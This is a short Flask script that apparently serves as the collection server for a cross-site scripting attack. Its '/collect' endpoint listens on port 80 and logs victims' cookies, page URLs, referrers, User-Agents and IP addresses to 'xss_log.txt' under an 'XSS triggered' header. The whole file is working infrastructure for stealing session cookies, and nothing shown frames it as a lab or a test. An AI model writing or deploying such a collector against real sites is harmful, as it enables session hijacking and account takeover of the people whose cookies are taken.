from flask import Flask, request

app = Flask(__name__)

@app.route('/collect', methods=['GET'])
def collect():
    # Log the incoming data to a file
    with open('xss_log.txt', 'a') as f:
        f.write(f"XSS triggered:\n")
        f.write(f"Cookies: {request.args.get('c')}\n")
        f.write(f"URL: {request.args.get('url')}\n")
        f.write(f"Referrer: {request.args.get('ref')}\n")
        f.write(f"User-Agent: {request.headers.get('User-Agent')}\n")
        f.write(f"IP Address: {request.remote_addr}\n")
        f.write(f"------------------------------------------------\n")
    return '', 204  # Return a 204 No Content response

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
